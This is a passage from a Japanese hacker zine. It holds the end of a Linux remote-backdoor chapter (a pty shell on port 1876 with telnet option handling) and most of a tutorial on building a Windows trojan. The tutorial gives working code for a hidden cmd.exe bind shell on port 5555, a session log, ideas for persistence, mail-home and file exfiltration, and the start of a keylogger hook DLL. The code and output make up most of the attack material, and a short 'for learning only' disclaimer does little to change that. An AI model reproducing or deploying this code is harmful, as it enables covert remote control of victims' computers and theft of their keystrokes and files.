+るとTELNET PROTOCOLを利用することで、telnetコマンドの設定をサーバ側から操
+作できるらしいので、この方法を試してみます。
+
+● 改良
+
+　TELNET PROTOCOLでは、接続開始時にお互いの環境を対応させるためにオプショ
+ンの要求ができます。今回は、「キー単位の入出力」と「ローカルエコーのOFF」
+を指示したいので、RFC 858（TELNET SUPPRESS GO AHEAD OPTION）、RFC 857
+（TELNET ECHO OPTION）が参考になります。
+
+　キャラクタ単位の入出力を実現するためには、ECHO、SUPPRESS GO AHEADが共に
+サーバ側で有効になっていることが条件です。
+
+　送り手が自分のオプションを有効にしたいことを示す場合はWILLを使い、
+
+-----
+IAC WILL ID
+-----
+
+　と送ります。これは実際には、
+
+-----
+0xff 0xfb ID
+-----
+
+　というデータとして送る必要があり、IDには有効になったオプションIDを指定
+します。
+　ECHO、SGA(SUPPRESS GO AHEAD)のオプションIDはそれぞれ、0x01、0x03となっ
+ていますので、
+
+-----
+IAC WILL ECHO
+0xff 0xfb 0x01
+
+IAC WILL SGA
+0xff 0xfb 0x03
+-----
+
+　となります。
+
+　実際に試してみます。
+　0x05で、書いたpty_rbd.cの-(3)-のところに以下の処理を追加します。
+
+-----  pty_rbd.c-(3)-
+  send(client, "\xff\xfb\x01", 3, 0); // ECHOの有効を知らせる
+  recv(client, buff, 16, 0);           // 空読み
+  send(client, "\xff\xfb\x03", 3, 0); // SGAの有効を知らせる
+  recv(client, buff, 16, 0);           // 空読み
+/* --- pty_rbd.c-(3)- へ追加 --- */
+-----
+
+　recv()は、サーバ側がオプションを要求するとクライアントがなんらかの返事
+をするので、それを空読みしています。本当は、それを調べてオプションが有効
+になったのかを判断する必要があるのですが、拒否されることはないだろうとい
+うことで空読みです。Linuxのtelnetコマンド、Windowsのtelnet.exe、TeraTerm
+のotherモードでは上記の方法でうまく設定することができました。
+
+　実際に試してみます。
+
+-----
+$ gcc pty_rbd.c -lutil -o backdoor
+$ ./backdoor &
+[2] 1782
+$ telnet localhost 1876
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+sh-2.05$ id
+uid=500(pain) gid=500(pain) 所属グループ=500(pain)
+sh-2.05$ emacs -nw test.c
+..
+sh-2.05$ vi test.c
+..
+sh-2.05$ passwd
+Changing password for pain
+(current) UNIX password:
+New password:
+Retype new password:
+passwd: all authentication tokens updated successfully
+sh-2.05$ exit
+Connection closed by foreign host.
+[2]-  Done                    ./a.out
+-----
+
+　window sizeを設定していないので表示範囲が少し狭かったですが、emacs、vi、
+passwdの動作確認は全て成功でした。
+
+
+■0x07.) 最後に
+
+　今回、単純なリモートバックドアをemacsが使える程度まで改良しました。しか
+し、今回取り上げた内容だけでは、サーバとしては役に立たないほど問題が残っ
+ています（例えばexitするとサーバごと落ちること）。しかし、それらの情報は
+インターネット上のネットワークプログラミングを説明した多くのサイト（Aiko
+さんのkenjinet等）で説明されているので、今回は省きました。また、「リモー
+トバックドア」としての機能面でもTCPを使っている点などまだまだ多くの問題が
+残っています。まだ問題が残っているということは、あなたにも考えるチャンス
+があるということです。もし、優れたバックドアが作成できたら･･･俺にください。'-)
+
+　今回使用したサンプルコードと、私が趣味で書いたLinuxとMacOS Xで動くリモ
+ートバックドア（TCP Shell）が以下のディレクトリに置いてあります。興味のあ
+る方は見てみてください。
+
+http://hex51.darktech.org/wb/200402/
+
+　余談ですが、forkpty(3)は面白い関数なので、遊んでみるとなかなか楽しめま
+す。私はこれを利用して、Linux用のKeyLoggerTrojanを作ってみました。
+
+　PaiNでした。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第３章: トロイの木馬を作ってみよう　～Windows篇～ ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Windows用の簡単なトロイの木馬を作ります。OSはWindowsXPを利用しています。
+コンパイラはVC++.NETとVC++6.0で確認ずみです。それ以外は私自身使ったことが
+ないので分かりません。あとBCCでもＯＫだと思いますが、私はBCCではコンソー
+ルプログラムしか書いたことがないのでこちらもちからになれません。前提とな
+る知識は、Windowsプログラミング（特にWin32API）に関してある程度の知識があ
+ることと、TCP/IPを利用したプログラムを組んだことがあること（簡単なサーバ
+を作ったことがあるなど）です。でもまぁこれはあくまで目安ですので、ネット
+で調べながら読んでいけばなんとかなるかと(^^;　あと、これは実際のトロイの
+動作を学ぶため（勉強のため）に作るのであって、これを利用して悪だくみを考
+えているわけでは決してありません。あくまで「学ぶため」でありそのほかの目
+的はありません。
+
+
+■0x02.) トロイの木馬とは
+
+　トロイの木馬とはデータ消去やファイルの外部流出、他のコンピュータの攻撃
+などの破壊活動を行なうプログラムのこと。（中略）実行したとたん破壊活動を
+始めるものもあるが、システムの一部として潜伏し、時間が経ってから「発症」
+するものや、他のユーザがそのコンピュータを乗っ取るための「窓口」として機
+能するものなどもある（ＩＴ用語辞書e-Words（http://e-words.jp/）より）。
+
+　これには「破壊活動を始めるものもある」と書かれていますが今回作るのは、
+窓口としてポートを開くだけの簡単なものを作ります。
+
+
+■0x03.) 外部プロセスの起動
+
+　まず最初にプロセスやパイプなどの基本的な概念から学んでいきます。Create
+Process関数は外部のプロセスを起動するために使います。これを利用すると、例
+えばプログラムの中で他のプログラム（外部のプロセス）を実行することができ、
+しかもそのプログラムの起動や終了を確認することができます。まずは簡単な使
+い方を示します。
+　詳細は、MSDNのCreateProcessを参照してください。
+
+※CreateProcess
+http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_createprocess.htm
+
+-----
+BOOL CreateProcess(
+  LPCTSTR lpApplicationName,                 // 実行可能モジュールの名前
+  LPTSTR lpCommandLine,                      // コマンドラインの文字列
+  LPSECURITY_ATTRIBUTES lpProcessAttributes, // セキュリティ記述子
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // セキュリティ記述子
+  BOOL bInheritHandles,                      // ハンドルの継承オプション
+  DWORD dwCreationFlags,                     // 作成のフラグ
+  LPVOID lpEnvironment,                      // 新しい環境ブロック
+  LPCTSTR lpCurrentDirectory,                // カレントディレクトリの名前
+  LPSTARTUPINFO lpStartupInfo,               // スタートアップ情報
+  LPPROCESS_INFORMATION lpProcessInformation // プロセス情報
+);
+-----
+
+　MSDNには上記のような定義が書かれてあります。lpApplicationNameは要するに
+実行すべきプログラムの名前です。次のlpCommandLineはコマンドラインにわたす
+文字列であり、lpApplicationNameをNULLにして、これにプログラム名を書いても
+よいというかむしろこっちに書くべきです。なぜならlpCommandLineにはプログラ
+ムにわたす引数も指定できるからです（引数を使わないならどちらでもよいです
+が）。bInheritHandlesはTRUEでハンドルの継承ですが基本的にTRUEにしておけば
+問題ないでしょう。lpCurrentDirectoryはカレントディレクトリの場所であり例え
+ば"c:\","c:\usr\"などを設定します（間違えやすいものでソース上では'\'は'\\'
+で表現します）。そのディレクトリに移動してlpCommandLineの文字列が実行され
+ます。lpStartupInfoにはプロセス作成に対するさまざまな情報を格納します。最
+後のlpProcessInformationは空のPROCESS_INFORMATION構造体を渡せば、なんらか
+の情報を格納してくれます。他は基本的にNULLで構いませんが、詳細を知りたい
+方はMSDNを参照してください。以下にこれを利用した簡単なプログラムを示します。
+
++--- CreateProcess.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/CreateProcess.cpp |
++-------------------------------------------------------+
+
+-----  CreateProcess.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <iostream>
+
+using namespace std;
+
+void main(void)
+{
+    STARTUPINFO            SI;
+    PROCESS_INFORMATION    PI;
+
+    ZeroMemory(&SI, sizeof(SI));
+    SI.cb = sizeof(SI);
+
+    if(CreateProcess(NULL, "notepad",
+        NULL, NULL, TRUE, 0, NULL, NULL, &SI, &PI) == 0){
+            cout << "ERROR..." << endl;
+            exit(1);
+    }
+
+    CloseHandle(PI.hThread);
+
+    cout << "START..." << endl;
+    WaitForSingleObject( PI.hProcess, INFINITE );
+    cout << "END..." << endl;
+
+    CloseHandle( PI.hProcess );
+}
+-----
+
+　動作が分かりやすいようにコンソールプログラムにしました。コマンドプロン
+プトから実行してください。プログラムの簡単な説明をします。まずZeroMemory
+関数はその名のとおりゼロ初期化します。Linuxではbzeroやmemsetを使いますが
+Windowsではこちらを使います（もちろんmemsetはWindowsでも使えます）。Crea
+teProcess関数で外部のプロセス（ここではnotepad）を実行しています。WaitFo
+rSingleObject関数でプロセスが終了するのを待ち、終了を確認したら"END..."を
+出力しこのプログラム自身も終了します。WaitForSingleObjectの第二引数は待つ
+時間をミリ秒単位で指定できます。INFINITEを指定すると第一引数のプロセスが
+終了するまで無限に待ちます。
+
+
+■0x04.) プロセスとパイプ
+
+　Windowsにはパイプという概念があります（もちろんLinuxにもありますが）。
+例えばコマンドプロンプトで以下のように打ってみてください。
+
+-----
+C:\...\kenji>
+C:\...\kenji>help | more
+特定のコマンドの詳細情報は、"HELP コマンド名" を入力してください
+ASSOC    ファイル拡張子の関連付けを表示または変更します。
+AT       コマンドやプログラムを指定した日時に実行します。
+...
+...
+DISKCOMP 2 つのフロッピー ディスクの内容を比較します。
+-- More  --
+-----
+
+　するとhelpコマンドで出力された文字列で一画面が埋まってしまったらMoreが
+機能して出力がストップします。helpとmoreは別々のコマンド（プログラム）で
+あるはずなのにそれぞれの機能が働いています。この挙動から説明してみるとhe
+lpで出力された文字列がmoreに渡されて、もし一画面が埋まってしまったらスト
+ップをかける。という処理が行われているようです。moreは別のプロセス（help）
+からのデータを取得している。つまり、それぞれ別のプロセス同士（このばあい
+はhelpとmore）がパイプで繋がれているということです。ではプログラムを書い
+てみます。
+
++--- CreatePipe.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/CreatePipe.cpp |
++----------------------------------------------------+
+
+-----
+case WM_CREATE:
+    if((MainMemory = (char *)VirtualAlloc(
+        NULL, TEXT_SIZE, MEM_COMMIT, PAGE_READWRITE)) == NULL){
+            MessageBox(hWnd, "必要な領域を確保できませんでした", "Error", MB_OK);
+            DestroyWindow(hWnd);
+    }
+    GetClientRect(hWnd, &rect);
+    hEditWindow = CreateWindow("EDIT", NULL,
+        WS_CHILD | WS_VISIBLE | ES_WANTRETURN | ES_MULTILINE | 
+        ES_AUTOVSCROLL | WS_VSCROLL | ES_AUTOHSCROLL | WS_HSCROLL,
+        0, 0, rect.right, rect.bottom,
+        hWnd, NULL, hInst, NULL);
+    SendMessage(hEditWindow, EM_SETLIMITTEXT, (WPARAM)TEXT_SIZE, 0);
+    CreatePipeTest(hEditWindow, MainMemory);
+    break;
+-----
+
+　まずWM_CREATEが呼ばれたらメモリを確保します。このメモリはプログラムの最
+初でdefineされているTEXT_SIZEの領域だけ確保します。メモリ開放はWM_DESTROY
+（つまりプログラムの終了）のところで行っています。この確保したメモリ領域
+とまったく同じデータが書き込めるテキスト領域（メモ帳のようにテキストが入
+力できるWindow）を作成します。それがCreateWindowですね。そのあとパイプの
+実験を行う関数CreatePipeTestを呼びます。CreatePipeTestの引数はいま作った
+テキスト領域と確保したメモリのポインタです。では次はCreatePipeTest関数に
+行きます。
+
+-----
+CreatePipe(&pfd_out[R], &pfd_out[W], &SA, 0);
+DuplicateHandle(hParent, pfd_out[R], hParent, &fd_write, 0, FALSE, DUPLICATE_SAME_ACCESS);
+CloseHandle(pfd_out[R]);
+-----
+
+　まずはCreatePipeによりpfd_out配列の二つのデータをそれぞれREAD,WRITEとし
+ます。READの方をfd_writeに複写してCloseHandleで閉じます。これで「pfd_out
+[W]」と「fd_write」がパイプでつながったことになります。次の３行も同じです。
+CreatePipeによりpfd_err配列の二つをそれぞれREAD,WRITEとします。READの方を
+fd_errに複写して閉じます。これで同じく「pfd_err[W]」と「fd_err」がつなが
+ったことになります。
+
+-----
+CreatePipe(&pfd_in[R], &pfd_in[W], &SA, 0); 
+DuplicateHandle(hParent, pfd_in[W], hParent, &fd_read, 0, FALSE, DUPLICATE_SAME_ACCESS);
+CloseHandle(pfd_in[W]);
+-----
+
+　そしてここも同じですね。CreatePipeによりpfd_in配列の二つのデータをそれ
+ぞれREAD,WRITEとし、今度はWRITEの方はfd_readに複写して閉じます。これで
+「pfd_in[R]」と「fd_read」がつながったことになります。
+
+-----
+STARTUPINFO SI;
+ZeroMemory(&SI, sizeof(SI));
+SI.cb          = sizeof(SI);
+SI.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+SI.wShowWindow = SW_HIDE;
+SI.hStdInput   = pfd_in[R];
+SI.hStdOutput  = pfd_out[W];
+SI.hStdError   = pfd_err[W];
+-----
+
+　CreateProcessに渡す情報を設定しています。ここで、fd_read, fd_write, fd
+_errのそれぞれとパイプで繋がっているpfd_out[W], pfd_err[W], pfd_in[R]が設
+定されています。これらはそれぞれ新しく生成されるプロセスの標準入出力を担
+当させます。SI.wShowWindowはWindowとして表示するかどうかでSW_HIDEを指定す
+ると表示させません（内部で処理されます）。このような設定をもたせてプロセ
+スを生成するわけです。
+
+　CreateProcessでプロセスが生成されてcmd.exe（コマンドプロンプト）が実行
+されます。もちろんcmd.exeは別のプロセスですよね。しかし、fd_readと生成さ
+れたプロセスの標準入力（pfd_in[R]）はパイプで繋がれています。よって
+
+-----
+DWORD Len;
+WriteFile(fd_read, "dir\r\n",  5, &Len, NULL);
+WriteFile(fd_read, "exit\r\n", 6, &Len, NULL);
+-----
+
+WriteFile関数でfd_readに文字列を書き込むと、別プロセスであるcmd.exeの標準
+入力（pfd_in[R]）に文字列が書き込まれることになります。ということは
+
+-----
+ReadFile(fd_write, MainMemory, TEXT_SIZE - 1, &Len, NULL);
+MainMemory[Len] = '\0';
+-----
+
+このようにReadFileを使って標準出力のデータを取得することも可能であるとい
+うことです。つまりパイプを利用するとプロセス同士でのデータのやり取りが可
+能になるということです。
+
+
+■0x05.) スレッド
+
+　スレッドとはプログラム上で動作するある特定の処理のことをいい、複数の処
+理を同時に実行するしくみです。もちろん実際にCPUが同時に実行してるわけでは
+ありませんが概念としてはこういう理解でよいと思います。
+
+　「プロセスとスレッドはどう違うのか？」という疑問に対して（かなり）簡単
+に説明します。詳細は別で調べてください（それぞれかなり奥が深いので）。ス
+レッドとはひとつのプロセスの中で複数の処理を同時に実行する仕組みです。つ
+まり、まずプログラムが実行されるとプロセスが生成されそしてその中でひとつ
+以上のスレッドが生成されます。よってスレッドはプロセスの中で別々に処理さ
+れるしくみということですので、データが共有されます。プロセス同士はそれぞ
+れ完全に独立したメモリ空間を持ちますが（Windows9x系は例外です）スレッド同
+士は同じプロセスですのでメモリ空間を共有します。つまりあるスレッドがa=5;
+という式を実行したら「同じプロセス内のすべてのスレッドに影響を及ぼす」と
+いうことです。
+
+（注意：もしかしたら上記の認識は間違ってるかもしれません^^;　ただ考え方と
+してはこんな感じでよいと思います。）
+
+　ここでのサンプルでは常にマウスの位置を取得し続けるスレッドを作成したい
+と思います。リアルタイムでマウスの位置をWindowに出力します。
+
++--- CreateThread.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/CreateThread.cpp |
++------------------------------------------------------+
+
+　長々とスケルトンが生成してくれたWindow描画処理が続きます。そしてWM_CRE
+ATEを見てみます。
+
+-----
+Data.hEditWindow = hEditWindow;
+Data.hWnd        = hWnd;
+Data.ExeFlag     = TRUE;
+
+DWORD ID;
+if((Thread = CreateThread(NULL, 0, MyThread, (LPVOID)&Data, 0, &ID)) == NULL){
+    MessageBox(hWnd, "スレッドが作成できませんでした", "Error", MB_OK);
+    DestroyWindow(hWnd);
+}
+break;
+-----
+
+　WM_CREATE内です。適当なデータをいれてスレッドを生成しています。Data.Ex
+eFlagはスレッドのwhileループを抜けさせるために使用します。とりあえずCrea
+teThreadの説明をします。
+
+-----
+HANDLE CreateThread(
+  LPSECURITY_ATTRIBUTES lpThreadAttributes, // セキュリティ記述子
+  DWORD dwStackSize,                        // 初期のスタックサイズ
+  LPTHREAD_START_ROUTINE lpStartAddress,    // スレッドの機能
+  LPVOID lpParameter,                       // スレッドの引数
+  DWORD dwCreationFlags,                    // 作成オプション
+  LPDWORD lpThreadId                        // スレッド識別子
+);
+-----
+
+　MSDN CreateThread（http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_createthread.htm）
+には上記のように定義されています。まず最初のlpThreadAttributesは「NULL 
+を指定すると、既定のセキュリティ記述子がこのスレッドに適用されます。」と
+書かれてあるので、NULLで問題ないでしょう。dwStackSizeも'0'をいれていけば
+既定のサイズとして割り当ててくれるらしいので'0'にしときます。lpStartAddr
+essは「LPTHREAD_START_ROUTINE 型のアプリケーション定義関数へのポインタを
+指定します。この関数は新しいスレッドで実行されるものであり、同時に新しい
+スレッドの開始アドレスを指定します。」とあるので、実行したい関数のポイン
+タを設定しましょう。lpParameterは関数に渡す引数ですね。複数の引数を渡した
+いばあいは構造体のポインタなどを利用しましょう。dwCreationFlagsは「このパ
+ラメータで 0 を指定すると、作成と同時に新しいスレッドが動作します。」とあ
+るので'0'にしときましょう。最後のlpThreadIdはスレッド識別子らしいですが、
+まぁDWORD型のポインタを渡しとけば問題ないでしょう。
+
+-----
+DWORD WINAPI MyThread(LPVOID pData)
+{
+    DATA *Data = (DATA *)pData;
+    char string[32];
+    POINT pt;
+
+    while(Data->ExeFlag){
+        GetCursorPos(&pt);
+        InvalidateRect(Data->hWnd , NULL, FALSE);
+
+        wsprintf(string, "%d : %d", pt.x, pt.y);
+        Edit_SetText(Data->hEditWindow, string);
+        Sleep(100);
+    }
+
+    return 0;
+}
+-----
+
+　MyThread関数です。CreateThreadから生成されて実行される関数ですね。引数
+は構造体ポインタとしてもらってきてます。Data->ExeFlagはWM_DESTROYで初めて
+FALSEになるので、終了するまでwhileの中にいることになります。これは見れば
+わかりますがマウスの位置を取得して表示しています。Sleep(100)なので表示間
+隔は0.1秒ですね。もしスレッドを利用していなかったらプログラムがこのWhile
+でループしつづけるので、メッセージを受け取れなくなりWindowの移動や大きさ
+の変更などができなくなり、ばあいによっては（ただでさえWindowsは不安定なの
+で）応答無しと判断され強制終了し、「エラーをMSサーバに送りますか」などと
+いうふざけたダイアログがでるかもしれません。私はXPを使っているのですが、
+正直このダイアログだけはどうにかしてほしいです(^^;　しかしスレッドとして
+別に処理を行っているので通常のメッセージも受け取りながらマウスの位置をリ
+アルタイムで取得できるわけです。
+
+-----
+case WM_DESTROY:
+    Data.ExeFlag = FALSE;
+    WaitForSingleObject(Thread, 3000);
+    CloseHandle(Thread);
+    PostQuitMessage(0);
+    break;
+-----
+
+　ここは終了処理ですね。Data.ExeFlagをFALSEにしてMyThread関数をwhileから
+抜け出させ終了させます。そのあとWaitForSingleObjectで待ちCloseHandleで終
+了処理をほどこしてプログラムを終わります。WaitForSingleObjectの第二引数は
+INFINITEを指定すると終了を確認するまで無限に待つわけですが、万が一なんら
+かの理由でスレッドが終了しなかったばあい、ここで処理が止まりプログラム自
+体がフリーズしてしまう恐れがあるので3秒だけ待って、もし終了が確認できなか
+ったら無視します。
+
+
+■0x06.) 簡易トロイの木馬
+
+　ではこれまでのピースを集めてきます。基本的にサーバとして起動させます。
+もちろんこっそりと起動させなければいけないのでWindowは非表示にしなければ
+なりませんがこれはShowWindowなどをコメントアウトすればよいので簡単です。
+起動させたらまずはソケットを開きacceptで待ちます。ポートはどこでよいです
+ので適当に決めてください。接続要求がきたら（攻撃者が接続してくる）Create
+Processにより新しいプロセスを作りcmd.exe（コマンドプロンプト）を実行しま
+す。そしてコマンドプロンプトの標準入出力とソケットをパイプで繋ぎます。こ
+れで攻撃者側から送信されたデータはそのままコマンドプロンプトの標準入力に
+渡さるようにします。標準出力のデータはスレッドを利用し、リアルタイムでク
+ライアント（攻撃者）に渡されるようにします。あとはやりたい放題！　わしょ
+ーい！　...と、概略はこんな感じです。ではソースを見てください。
+
++--- trojan01.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/trojan01.cpp |
++--------------------------------------------------+
+
+-----
+case WM_CREATE:
+    if((sListen = WaitConnect(hWnd)) == -1){
+        DestroyWindow(hWnd);
+    }
+    Data.acceptFlag = TRUE;
+    break;
+-----
+
+　まず最初に、サーバとして稼動させるためにポートを開きます。Data.acceptF
+lagはクライアントが接続できるかどうかで、FALSEなら「できない」TRUEなら「
+できる」です。逆にいえばFALSEなら接続状態であり、TRUEなら待ち状態です。最
+初は待ちなのでTRUEにします。WaitConnect関数はシンプルなので説明はしません。
+単純にサーバとしてソケットを作成してるだけです。
+
+-----
+case FD_ACCEPT:
+    AcceptConnect(sListen, &Data);
+    break;
+-----
+
+　FD_ACCEPTは接続要求がきたときに実行されます。AcceptConnect関数でaccept
+関数を呼び出して対応させます。
+
+-----
+BOOL AcceptConnect(SOCKET sListen, DATA *Data)
+{
+    SOCKET sock_tmp;
+    SOCKADDR_IN Client;
+    int ClientLen = sizeof(Client);
+    if((sock_tmp = accept(sListen,
+        (LPSOCKADDR)&Client, &ClientLen)) == INVALID_SOCKET){
+            return TRUE;
+    }
+    
+    if(Data->acceptFlag){
+        Data->acceptFlag = FALSE;
+        Data->sock = sock_tmp;
+    }else{
+        closesocket(sock_tmp);
+        return TRUE;
+    }
+-----
+
+　Data->acceptFlagの値により接続要求を受け付けるか拒否するかを決めます。
+別のクライアントが接続中ならFALSEになっているのでそのまま新しく接続してき
+たクライアントのソケットは無条件で閉じます。待ち状態だったならTRUEなので
+ソケットをData->sockにコピーして処理を続けます。
+
+-----
+    send(Data->sock, START_STRING, (int)strlen(START_STRING), 0);
+-----
+
+　接続が確立したことを示す文字列をクライアントに送信します。その後のソー
+スはプロセスとパイプの生成処理です。これは説明ずみなのではぶきます。そし
+てそのパイプを利用して標準出力を取得する処理が以下です。
+
+-----
+    DWORD len;
+    char buf[256];
+    ReadFile(Data->fd_write, buf, sizeof(buf), &len, NULL);
+
+    char *p;
+    if((p = strchr(buf, '>')) != NULL){
+        *(p + 1) = '\0';
+        send(Data->sock, buf, (int)strlen(buf), 0);
+    }
+-----
+
+　特に問題ないでしょう。'>'が発見されるまでの文字列をクライアントに送りま
+す（DOSは"c:\kenji>"というような感じでコマンドを受け付けますので'>'までを
+表示させるようにします）。発見できなかったばあいは無視します（なんらかの
+エラーかもしれませんけどね）。
+
+-----
+    Data->ThreadFlag = TRUE;
+
+    DWORD ThreID;
+    if((Data->hThread = CreateThread(NULL, 0,
+        OutputToSocket, (LPVOID)Data, 0, &ThreID)) == NULL){
+            DWORD len;
+            WriteFile(Data->fd_read, "exit\r\n", 6, &len, NULL);
+            FlushFileBuffers(Data->fd_read);
+            WaitForSingleObject(Data->PI.hProcess, 3000);
+            CloseHandle(Data->PI.hProcess);
+            CloseHandle(Data->fd_read);
+            CloseHandle(Data->fd_write);
+            return TRUE;
+    }
+    
+    return FALSE;
+}
+-----
+
+　スレッドの生成ですね。Data->ThreadFlagはOutputToSocket関数をみてくださ
+い。OutputToSocketの終了を制御するフラグです。もしCreateThreadでエラーが
+でたばあいはさっき作ったプロセスも終了させなければいけないので"exit"文字
+列を送りcmd.exeを終了させています。
+
+-----
+case FD_READ:
+    ReadConnect(&Data, hWnd);
+    break;
+-----
+
+　FD_READは受信バッファにデータが溜まったときに実行されます。
+
+-----
+void ReadConnect(DATA *Data, HWND hWnd)
+{
+    char c;
+    DWORD len;
+    recv(Data->sock, &c, 1, 0);
+    WriteFile(Data->fd_read, &c, 1, &len, NULL);
+    FlushFileBuffers(Data->fd_read);
+
+    return;
+}
+-----
+
+　シンプルですね。受信バッファに溜まっているデータを１バイト読み込んで標
+準入力に出力しています。
+
+-----
+DWORD WINAPI OutputToSocket(LPVOID lpvoid)
+{
+    DATA  *Data = (DATA *)lpvoid;
+
+    DWORD len;
+    char buf[1024];
+    while(Data->ThreadFlag){
+        if(ReadFile(Data->fd_write, &buf, sizeof(buf), &len, NULL) != FALSE){
+            if(len > 0){
+                send(Data->sock, buf, len, 0);
+            }
+        }    
+    }
+
+    return 0;
+}
+-----
+
+　CreateThreadで生成されるスレッドの処理です。標準出力からデータを取得し
+てクライアントに送信しています。この処理はリアルタイムで行われます。
+
+-----
+case FD_CLOSE:
+    CloseConnect(&Data);
+    Data.acceptFlag = TRUE;
+    break;
+-----
+
+　切断要求がきたときに実行されます。CloseConnectは後始末を担当しています。
+スレッドを終了させたり、プロセス（cmd.exe）を終了させたりさまざまなハンド
+ルを閉じたり、初期状態にして次の接続を待ちます。ここでData.acceptFlagをT
+RUEにして再び待ち状態にさせます。では、とりあえずここまでで重要な関数の説
+明をしたので、ここでこのプログラム全体のおおまかな概要を示します（図１）。
+
++----------------------------+ 
+| cmd.exe                    | （プロセス２）
++----------------------------+ 
+ ↑入力      ↓出力
++---------+ +----------------+
+| WinMain | | OutputToSocket | （プロセス１）
++---------+ *----------------+
+ ↑送信      ↓受信
++----------------------------+
+| クライアント               |
++----------------------------+
+                       （図１）
+
+　最初はWinMainだけですが、クライアントの接続要求をうけた直後（AcceptCon
+nect関数）からプロセス２（cmd.exe）とスレッドOutputToSocketを生成します。
+WinMainとOutputToSocketはそれぞれリアルタイムでクライアントとcmd.exeの橋
+渡しをします。入力（送信）はメッセージFD_READとしてWinMainに処理させて、
+出力（受信）はスレッドでリアルタイムで監視というかたちになります。このよ
+うにして"cmd.exe"をそのまま利用できるサービスを実現しています（サービスと
+いう言い方は違うような気もしますが）。そして切断処理が行われると同時にプ
+ロセス２（cmd.exe）とスレッドOutputToSocketを終了させて、再びWinMainだけ
+となりクライアントの接続要求を待つ。という風になります。
+
+　これで説明は終わりました。では実行してみてください。HIDEをdefineすると
+Windowを非表示にしますが、終了させるのがめんどくさくなるので基本的に表示
+させといたほうがよいです。起動させたら別Windowでコマンドプロンプトを起動
+させてtelnetでポート5555番に接続してみてください。
+
+-----
+C:\Documents and Settings\kenji>telnet loclalhost 5555
+
+connection ok!
+
+(C) Copyright 1985-2008 Microsoft Corp.
+
+c:\>dir
+dir
+ ドライブ C のボリューム ラベルは Windows XP 2008 です
+ ボリューム シリアル番号は ZZ88-ZZDD です
+
+ c:\ のディレクトリ
+
+2008/12/08  21:07                 0 AUTOEXEC.BAT
+2008/12/08  21:07                 0 CONFIG.SYS
+2008/12/18  20:14    <DIR>          Documents and Settings
+2008/12/08  19:46    <DIR>          My Music
+2008/01/08  16:08    <DIR>          Program Files
+2008/02/08  23:54    <DIR>          WINDOWS
+2008/12/08  14:46    <DIR>          WinXP
+               2 個のファイル                   0 バイト
+               5 個のディレクトリ   9,999,999,999 バイトの空き領域
+
+c:\>
+-----
+
+　見事、telnetからポート5555に接続しcmd.exeを利用できるようになっています。
+これでDOSコマンドは打てるので、どんなイタズラができるのかはhelpコマンドを
+参照してください(^^;
+
+
+■0x07.) 機能追加を考える
+
+　これで簡単なトロイの木馬はできたのですが、こうなると今度はいろいろと機
+能を追加していこうと考えるはずです（考えますよね^^;）。トロイの機能といえ
+ば、例えばファイルをＤＬできるようにするとか、キーログをとるとか、ターゲ
+ットＰＣが起動したときにトロイが実行されるようにするとか、さらに自分宛に
+ターゲットＰＣの起動を知らせるメールを送信するとか、まぁいろいろとありま
+す。起動と同時にトロイを実行させるのはレジストリをいじればいいので簡単で
+すね。メールも起動と同時にSMTPを利用して送信すればいいので問題ないです。
+ファイルＤＬはFTPサーバとして動作させないといけないのでちょっとメンドクサ
+イですがWinInetを利用してFTPクライアントとしてどこぞのFTPサーバ（例えば自
+分のＨＰとか）にファイルをＵＰさせるようにすれば容易に実現できます。キー
+ログもフックを使えばよいので特に難しくはないでしょう。
+
+　ということでどれも実現できそうなものなのです、残念ながら全部実装するよ
+うな根気や時間は私にはありません(^^;　ということで今回はこの中からひとつ
+選びキーログを実装してみました。キーのログファイルもtypeコマンドで閲覧で
+きるので以外にお買い得です（お買い得って...）。
+
+
+■0x08.) KeyLogger
+
+　キーログ機能はフックを使って実現します。キー入力をDLL側から監視すること
+によってアプリケーション外のメッセージ（キー入力）を横取りします。よって
+ここからはDLLの作成方法に関する知識が必要になります。SetWindowsHookEx関数
+の定義は以下です。
+
+-----
+HHOOK SetWindowsHookEx(
+  int idHook,
+  HOOKPROC lpfn,
+  HINSTANCE hMod,
+  DWORD dwThreadId
+);
+-----
+
+　idHookがフックのタイプ（WH_KEYBOARD, WH_GETMESSAGE, WH_MOUSE, WH_MSGFI
+LTER etc...）、lpfnが横取りしたデータを渡す関数（プロシージャ）へのポイン
+タ。hModはDLLのインスタンスハンドル、dwThreadIdはスレッドＩＤであり、'0'
+にするとすべてのスレッドがフックされます。戻り値はフックハンドル。 
+
+-----
+BOOL UnhookWindowsHookEx(
+  HHOOK hhk
+);
+-----
+
+　こっちはフックを解除する関数です。フックハンドルを渡すだけです。ではこ
+れらを利用してキー入力のフックを担当するDLLを作ります。
+
++--- keyhook.h -----------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/keyhook.h   |
++-------------------------------------------------+
+
++--- hookDll.cpp ---------------------------------+
+| http://kenjinet.s26.xrea.com/trojan/hookDll.cpp |
++-------------------------------------------------+
+
+-----
+case DLL_PROCESS_ATTACH:
+    ghInst = (HINSTANCE)hModule;
+    LPCTSTR szWindowClass   = TEXT(CLASS_NAME);
+    LPCTSTR szTitle         = TEXT(TITLE_NAME);
+    if((hWnd = FindWindow(szWindowClass, szTitle)) == NULL){
+        return TRUE;
+    }
+    break;
+-----
+
